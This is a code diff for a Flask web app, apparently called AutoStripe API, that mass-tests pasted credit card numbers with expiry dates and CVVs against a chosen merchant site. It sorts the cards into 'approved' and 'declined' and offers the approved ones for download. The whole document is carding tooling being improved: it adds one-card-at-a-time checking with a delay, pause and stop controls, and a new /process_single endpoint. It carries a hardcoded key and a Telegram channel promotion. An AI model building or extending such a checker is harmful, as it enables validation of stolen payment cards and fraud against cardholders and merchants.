@@ -8,20 +8,19 @@ import random
 import string
 import os
 import logging
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from io import StringIO
-import json
 from datetime import datetime
 
+# Join : t.me/GatewayMaker
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-mass_check_results = {}
-mass_check_status = {}
 approved_cards_storage = []
+processing_queue = []
+processing_lock = False
+current_processing_index = 0
 
 @app.route('/')
 def home():
@@ -368,6 +367,17 @@ def home():
                 box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
             }
             
+            .btn-warning {
+                background: var(--warning);
+                color: white;
+            }
+            
+            .btn-warning:hover {
+                background: #e68900;
+                transform: translateY(-3px);
+                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            }
+            
             .result-container {
                 margin-top: 20px;
                 padding: 20px;
@@ -539,6 +549,13 @@ def home():
                 border-radius: 5px;
             }
             
+            .control-buttons {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 10px;
+                margin-top: 15px;
+            }
+            
             footer {
                 text-align: center;
                 padding: 30px 0;
@@ -571,6 +588,10 @@ def home():
                 
                 .stat-item {
                     margin-bottom: 15px;
+                }
+                
+                .control-buttons {
+                    flex-direction: column;
                 }
             }
         </style>
@@ -631,7 +652,7 @@ def home():
             <!-- Mass Checker Tab -->
             <div id="mass-tab" class="tab-content">
                 <div class="glass-card">
-                    <h3>Mass Card Checker (Max 200 Cards)</h3>
+                    <h3>Mass Card Checker</h3>
                     <div class="form-group">
                         <label for="mass-site">Site Domain</label>
                         <input type="text" id="mass-site" class="form-control" placeholder="example.com">
@@ -640,14 +661,23 @@ def home():
                         <label for="mass-cc">Card Details (One per line)</label>
                         <textarea id="mass-cc" class="form-control" placeholder="4242424242424242|12|25|123&#10;4000000000000002|12|25|123&#10;..."></textarea>
                     </div>
-                    <button class="btn btn-primary" onclick="checkMassCards()">
-                        <span id="mass-loader" style="display:none;" class="loader"></span>
-                        Check Cards
-                    </button>
-                    <button class="btn btn-secondary" onclick="clearMassResults()">Clear Results</button>
-                    <button class="btn btn-success" onclick="downloadApprovedCards()" id="download-btn" style="display:none;">
-                        <i class="fas fa-download"></i> Download Aprovados (.txt)
-                    </button>
+                    
+                    <div class="control-buttons">
+                        <button class="btn btn-primary" onclick="startMassCheck()" id="start-btn">
+                            <span id="mass-loader" style="display:none;" class="loader"></span>
+                            Start Check
+                        </button>
+                        <button class="btn btn-warning" onclick="pauseMassCheck()" id="pause-btn" style="display:none;">
+                            <i class="fas fa-pause"></i> Pause
+                        </button>
+                        <button class="btn btn-secondary" onclick="stopMassCheck()" id="stop-btn" style="display:none;">
+                            <i class="fas fa-stop"></i> Stop
+                        </button>
+                        <button class="btn btn-secondary" onclick="clearMassResults()">Clear All</button>
+                        <button class="btn btn-success" onclick="downloadApprovedCards()" id="download-btn" style="display:none;">
+                            <i class="fas fa-download"></i> Download Aprovados
+                        </button>
+                    </div>
                     
                     <div id="mass-progress" class="progress-bar" style="display:none;">
                         <div id="mass-progress-fill" class="progress-fill"></div>
@@ -669,6 +699,10 @@ def home():
                         <div class="stat-item">
                             <div id="mass-processed" class="stat-value">0</div>
                             <div class="stat-label">Processed</div>
+                        </div>
+                        <div class="stat-item">
+                            <div id="mass-current" class="stat-value">-</div>
+                            <div class="stat-label">Current</div>
                         </div>
                     </div>
                     
@@ -851,23 +885,21 @@ def home():
             }
             
             // Global variables for mass check
-            let approvedCardsList = [];
+            let massCards = [];
             let currentSite = '';
+            let currentCardIndex = 0;
+            let totalCards = 0;
+            let approvedCards = 0;
+            let declinedCards = 0;
+            let processedCards = 0;
+            let isChecking = false;
+            let isPaused = false;
+            let checkInterval = null;
             
-            // Check mass cards
-            function checkMassCards() {
+            // Start mass check
+            function startMassCheck() {
                 const site = document.getElementById('mass-site').value.trim();
                 const ccText = document.getElementById('mass-cc').value.trim();
-                const resultContainer = document.getElementById('mass-result');
-                const resultContent = document.getElementById('mass-result-content');
-                const progressBar = document.getElementById('mass-progress');
-                const progressFill = document.getElementById('mass-progress-fill');
-                const statsContainer = document.getElementById('mass-stats');
-                const downloadBtn = document.getElementById('download-btn');
-                const downloadSection = document.getElementById('download-section');
-                const downloadInfo = document.getElementById('download-info');
-                const approvedCount = document.getElementById('approved-count');
-                const loader = document.getElementById('mass-loader');
                 
                 if (!site || !ccText) {
                     showNotification('Please fill in all fields', 'error');
@@ -875,148 +907,229 @@ def home():
                 }
                 
                 // Parse cards
-                const cards = ccText.split('\\n').filter(card => card.trim());
+                massCards = ccText.split('\\n').filter(card => card.trim());
                 
-                if (cards.length === 0) {
+                if (massCards.length === 0) {
                     showNotification('Please enter at least one card', 'error');
                     return;
                 }
                 
-                if (cards.length > 200) {
+                if (massCards.length > 200) {
                     showNotification('Maximum 200 cards allowed', 'error');
                     return;
                 }
                 
-                // Reset approved cards list
-                approvedCardsList = [];
+                // Initialize variables
                 currentSite = site;
+                currentCardIndex = 0;
+                totalCards = massCards.length;
+                approvedCards = 0;
+                declinedCards = 0;
+                processedCards = 0;
+                isChecking = true;
+                isPaused = false;
                 
-                // Show loader and progress
-                loader.style.display = 'inline-block';
-                progressBar.style.display = 'block';
-                statsContainer.style.display = 'flex';
+                // Update UI
+                document.getElementById('start-btn').style.display = 'none';
+                document.getElementById('pause-btn').style.display = 'inline-block';
+                document.getElementById('stop-btn').style.display = 'inline-block';
+                document.getElementById('mass-loader').style.display = 'inline-block';
+                document.getElementById('mass-progress').style.display = 'block';
+                document.getElementById('mass-stats').style.display = 'flex';
                 
-                // Initialize stats
-                let total = cards.length;
-                let approved = 0;
-                let declined = 0;
-                let processed = 0;
-                
-                document.getElementById('mass-total').textContent = total;
-                document.getElementById('mass-approved').textContent = approved;
-                document.getElementById('mass-declined').textContent = declined;
-                document.getElementById('mass-processed').textContent = processed;
+                // Update stats
+                updateStats();
                 
                 // Clear previous results
-                resultContent.innerHTML = '';
-                resultContainer.classList.add('show');
+                document.getElementById('mass-result-content').innerHTML = '';
+                document.getElementById('mass-result').classList.add('show');
                 
-                // Hide download section initially
-                downloadSection.style.display = 'none';
-                downloadBtn.style.display = 'none';
+                // Hide download section
+                document.getElementById('download-section').style.display = 'none';
+                document.getElementById('download-btn').style.display = 'none';
                 
-                // Process cards
-                const results = [];
-                let completed = 0;
+                // Start checking cards one by one
+                checkNextCard();
+            }
+            
+            // Check next card in queue
+            function checkNextCard() {
+                if (!isChecking || isPaused || currentCardIndex >= massCards.length) {
+                    if (currentCardIndex >= massCards.length) {
+                        finishMassCheck();
+                    }
+                    return;
+                }
                 
-                cards.forEach((card, index) => {
-                    // Create result item
-                    const resultItem = document.createElement('div');
-                    resultItem.className = 'result-item processing';
-                    resultItem.innerHTML = `
-                        <div class="card-number">Card: ${formatCardNumber(card.split('|')[0])}</div>
-                        <div class="card-response">Processing...</div>
-                        <div class="card-status">Status: Checking</div>
-                    `;
-                    resultContent.appendChild(resultItem);
-                    
-                    // Make API request
-                    fetch(`/process?key=inferno&site=${site}&cc=${card}`)
-                        .then(response => response.json())
-                        .then(data => {
-                            // Update result item
-                            const isApproved = data.Status === 'Approved';
-                            resultItem.className = `result-item ${isApproved ? 'success' : 'error'}`;
-                            resultItem.innerHTML = `
-                                <div class="card-number">Card: ${formatCardNumber(card.split('|')[0])}</div>
-                                <div class="card-response">Response: ${data.Response}</div>
-                                <div class="card-status">Status: ${data.Status}</div>
-                            `;
-                            
-                            // Update stats
-                            if (isApproved) {
-                                approved++;
-                                // Add to approved cards list
-                                approvedCardsList.push({
-                                    card: card,
-                                    response: data.Response,
-                                    status: data.Status,
-                                    domain: site,
-                                    timestamp: new Date().toLocaleString()
-                                });
-                            } else {
-                                declined++;
-                            }
-                            processed++;
-                            completed++;
-                            
-                            document.getElementById('mass-approved').textContent = approved;
-                            document.getElementById('mass-declined').textContent = declined;
-                            document.getElementById('mass-processed').textContent = processed;
-                            
-                            // Update progress
-                            progressFill.style.width = `${(completed / total) * 100}%`;
-                            
-                            // Check if all cards are processed
-                            if (completed === total) {
-                                loader.style.display = 'none';
-                                
-                                // Show download section if there are approved cards
-                                if (approved > 0) {
-                                    downloadBtn.style.display = 'inline-block';
-                                    downloadSection.style.display = 'block';
-                                    approvedCount.textContent = `Approved Cards: ${approved}`;
-                                    downloadInfo.innerHTML = `
-                                        <p>${approved} card(s) approved successfully!</p>
-                                        <p>Click the download button to save all approved cards.</p>
-                                        <p>File format: cards_approved_[timestamp].txt</p>
-                                    `;
-                                }
-                                
-                                showNotification(`Mass check completed! Approved: ${approved}, Declined: ${declined}`, 'info');
-                            }
-                        })
-                        .catch(error => {
-                            // Update result item
-                            resultItem.className = 'result-item error';
-                            resultItem.innerHTML = `
-                                <div class="card-number">Card: ${formatCardNumber(card.split('|')[0])}</div>
-                                <div class="card-response">Error: ${error.message}</div>
-                                <div class="card-status">Status: Error</div>
-                            `;
-                            
-                            // Update stats
-                            declined++;
-                            processed++;
-                            completed++;
-                            
-                            document.getElementById('mass-declined').textContent = declined;
-                            document.getElementById('mass-processed').textContent = processed;
-                            
-                            // Update progress
-                            progressFill.style.width = `${(completed / total) * 100}%`;
-                            
-                            // Check if all cards are processed
-                            if (completed === total) {
-                                loader.style.display = 'none';
-                                showNotification(`Mass check completed! Approved: ${approved}, Declined: ${declined}`, 'info');
-                            }
-                        });
-                });
+                const card = massCards[currentCardIndex];
+                const resultContent = document.getElementById('mass-result-content');
+                
+                // Create result item
+                const resultItem = document.createElement('div');
+                resultItem.className = 'result-item processing';
+                resultItem.id = `card-${currentCardIndex}`;
+                resultItem.innerHTML = `
+                    <div class="card-number">Card ${currentCardIndex + 1}/${totalCards}: ${formatCardNumber(card.split('|')[0])}</div>
+                    <div class="card-response">Processing...</div>
+                    <div class="card-status">Status: Checking</div>
+                `;
+                resultContent.appendChild(resultItem);
+                
+                // Scroll to show new item
+                resultItem.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                
+                // Update current card display
+                document.getElementById('mass-current').textContent = `${currentCardIndex + 1}/${totalCards}`;
+                
+                // Make API request
+                fetch(`/process_single?key=inferno&site=${currentSite}&cc=${card}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        // Update result item
+                        const isApproved = data.Status === 'Approved';
+                        resultItem.className = `result-item ${isApproved ? 'success' : 'error'}`;
+                        resultItem.innerHTML = `
+                            <div class="card-number">Card ${currentCardIndex + 1}/${totalCards}: ${formatCardNumber(card.split('|')[0])}</div>
+                            <div class="card-response">Response: ${data.Response}</div>
+                            <div class="card-status">Status: ${data.Status}</div>
+                        `;
+                        
+                        // Update stats
+                        if (isApproved) {
+                            approvedCards++;
+                        } else {
+                            declinedCards++;
+                        }
+                        processedCards++;
+                        
+                        // Update progress and stats
+                        updateProgress();
+                        updateStats();
+                        
+                        // Move to next card
+                        currentCardIndex++;
+                        
+                        // Check if we should continue
+                        if (isChecking && !isPaused && currentCardIndex < massCards.length) {
+                            // Wait 1 second before processing next card
+                            setTimeout(checkNextCard, 1000);
+                        } else if (currentCardIndex >= massCards.length) {
+                            finishMassCheck();
+                        }
+                    })
+                    .catch(error => {
+                        // Update result item
+                        resultItem.className = 'result-item error';
+                        resultItem.innerHTML = `
+                            <div class="card-number">Card ${currentCardIndex + 1}/${totalCards}: ${formatCardNumber(card.split('|')[0])}</div>
+                            <div class="card-response">Error: ${error.message}</div>
+                            <div class="card-status">Status: Error</div>
+                        `;
+                        
+                        // Update stats
+                        declinedCards++;
+                        processedCards++;
+                        
+                        // Update progress and stats
+                        updateProgress();
+                        updateStats();
+                        
+                        // Move to next card
+                        currentCardIndex++;
+                        
+                        // Check if we should continue
+                        if (isChecking && !isPaused && currentCardIndex < massCards.length) {
+                            // Wait 1 second before processing next card
+                            setTimeout(checkNextCard, 1000);
+                        } else if (currentCardIndex >= massCards.length) {
+                            finishMassCheck();
+                        }
+                    });
+            }
+            
+            // Update progress bar
+            function updateProgress() {
+                const progressFill = document.getElementById('mass-progress-fill');
+                const progress = (processedCards / totalCards) * 100;
+                progressFill.style.width = `${progress}%`;
+            }
+            
+            // Update stats display
+            function updateStats() {
+                document.getElementById('mass-total').textContent = totalCards;
+                document.getElementById('mass-approved').textContent = approvedCards;
+                document.getElementById('mass-declined').textContent = declinedCards;
+                document.getElementById('mass-processed').textContent = processedCards;
+            }
+            
+            // Pause mass check
+            function pauseMassCheck() {
+                if (!isChecking) return;
+                
+                isPaused = !isPaused;
+                const pauseBtn = document.getElementById('pause-btn');
+                
+                if (isPaused) {
+                    pauseBtn.innerHTML = '<i class="fas fa-play"></i> Resume';
+                    showNotification('Checking paused', 'warning');
+                } else {
+                    pauseBtn.innerHTML = '<i class="fas fa-pause"></i> Pause';
+                    showNotification('Checking resumed', 'info');
+                    // Continue checking
+                    checkNextCard();
+                }
+            }
+            
+            // Stop mass check
+            function stopMassCheck() {
+                isChecking = false;
+                isPaused = false;
+                
+                // Reset UI
+                document.getElementById('start-btn').style.display = 'inline-block';
+                document.getElementById('pause-btn').style.display = 'none';
+                document.getElementById('stop-btn').style.display = 'none';
+                document.getElementById('mass-loader').style.display = 'none';
+                
+                showNotification('Checking stopped', 'warning');
+            }
+            
+            // Finish mass check
+            function finishMassCheck() {
+                isChecking = false;
+                isPaused = false;
+                
+                // Update UI
+                document.getElementById('start-btn').style.display = 'inline-block';
+                document.getElementById('pause-btn').style.display = 'none';
+                document.getElementById('stop-btn').style.display = 'none';
+                document.getElementById('mass-loader').style.display = 'none';
+                document.getElementById('mass-current').textContent = '-';
+                
+                // Show download section if there are approved cards
+                if (approvedCards > 0) {
+                    document.getElementById('download-btn').style.display = 'inline-block';
+                    document.getElementById('download-section').style.display = 'block';
+                    document.getElementById('approved-count').textContent = `Approved Cards: ${approvedCards}`;
+                }
+                
+                showNotification(`Mass check completed! Approved: ${approvedCards}, Declined: ${declinedCards}`, 'info');
             }
             
             // Clear mass results
             function clearMassResults() {
+                // Stop any ongoing check
+                stopMassCheck();
+                
+                // Reset variables
+                massCards = [];
+                currentCardIndex = 0;
+                totalCards = 0;
+                approvedCards = 0;
+                declinedCards = 0;
+                processedCards = 0;
+                
+                // Clear UI
                 document.getElementById('mass-result').classList.remove('show');
                 document.getElementById('mass-site').value = '';
                 document.getElementById('mass-cc').value = '';
@@ -1024,46 +1137,19 @@ def home():
                 document.getElementById('mass-stats').style.display = 'none';
                 document.getElementById('download-section').style.display = 'none';
                 document.getElementById('download-btn').style.display = 'none';
-                approvedCardsList = [];
-                currentSite = '';
+                document.getElementById('mass-progress-fill').style.width = '0%';
+                
+                // Reset buttons
+                document.getElementById('start-btn').style.display = 'inline-block';
+                document.getElementById('pause-btn').style.display = 'none';
+                document.getElementById('stop-btn').style.display = 'none';
             }
             
             // Download approved cards
             function downloadApprovedCards() {
-                if (approvedCardsList.length === 0) {
-                    showNotification('No approved cards to download', 'error');
-                    return;
-                }
-                
-                // Create a blob with the approved cards data
-                let fileContent = `AutoStripe API - Approved Cards\n`;
-                fileContent += `Generated on: ${new Date().toLocaleString()}\n`;
-                fileContent += `Site: ${currentSite}\n`;
-                fileContent += `Total Approved: ${approvedCardsList.length}\n`;
-                fileContent += `========================================\n\n`;
-                
-                approvedCardsList.forEach((card, index) => {
-                    fileContent += `[${index + 1}] ${card.card}\n`;
-                    fileContent += `Status: ${card.status}\n`;
-                    fileContent += `Response: ${card.response}\n`;
-                    fileContent += `Domain: ${card.domain}\n`;
-                    fileContent += `Time: ${card.timestamp}\n`;
-                    fileContent += `----------------------------------------\n`;
-                });
-                
-                // Create a blob and download link
-                const blob = new Blob([fileContent], { type: 'text/plain' });
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-                a.href = url;
-                a.download = `cards_approved_${timestamp}.txt`;
-                document.body.appendChild(a);
-                a.click();
-                window.URL.revokeObjectURL(url);
-                document.body.removeChild(a);
-                
-                showNotification(`Downloaded ${approvedCardsList.length} approved cards`, 'success');
+                // Make request to download endpoint
+                window.open('/download/approved', '_blank');
+                showNotification('Download started', 'success');
             }
         </script>
     </body>
@@ -1421,6 +1507,54 @@ def process_request():
         logger.error(f"Process request error: {e}")
         return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500
 
+@app.route('/process_single')
+def process_single_request():
+    """Processa apenas 1 cartão por vez para evitar uso excessivo de memória"""
+    try:
+        key = request.args.get('key')
+        domain = request.args.get('site')
+        cc = request.args.get('cc')
+        
+        logger.debug(f"Process single request: key={key}, domain={domain}, cc={cc}")
+        
+        if key != "inferno":
+            logger.error("Invalid API key")
+            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
+        
+        if not domain:
+            logger.error("Missing domain")
+            return jsonify({"error": "Missing domain parameter", "status": "Bad Request"}), 400
+        
+        # Remove protocolo se existir
+        if domain.startswith('https://'):
+            domain = domain[8:]
+        elif domain.startswith('http://'):
+            domain = domain[7:]
+            
+        if not re.match(r'^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}$', domain):
+            logger.error(f"Invalid domain: {domain}")
+            return jsonify({"error": "Invalid domain format", "status": "Bad Request"}), 400
+            
+        if not cc or not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
+            logger.error(f"Invalid card format: {cc}")
+            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
+        
+        # Processa apenas 1 cartão
+        result = process_card_enhanced(domain, cc)
+        
+        # Limpa memória após cada processamento
+        import gc
+        gc.collect()
+        
+        # Ensure consistent response format
+        return jsonify({
+            "Response": result.get("Response", result.get("response", "Unknown response")),
+            "Status": result.get("Status", result.get("status", "Unknown status"))
+        })
+    except Exception as e:
+        logger.error(f"Process single request error: {e}")
+        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500
+
 @app.route('/bulk')
 def bulk_process_request():
     try:
@@ -1453,6 +1587,9 @@ def bulk_process_request():
                     "Response": result.get("Response", result.get("response", "Unknown response")),
                     "Status": result.get("Status", result.get("status", "Unknown status"))
                 })
+                # Limpa memória após cada processamento
+                import gc
+                gc.collect()
             except Exception as e:
                 logger.error(f"Error processing {domain}: {e}")
                 results.append({
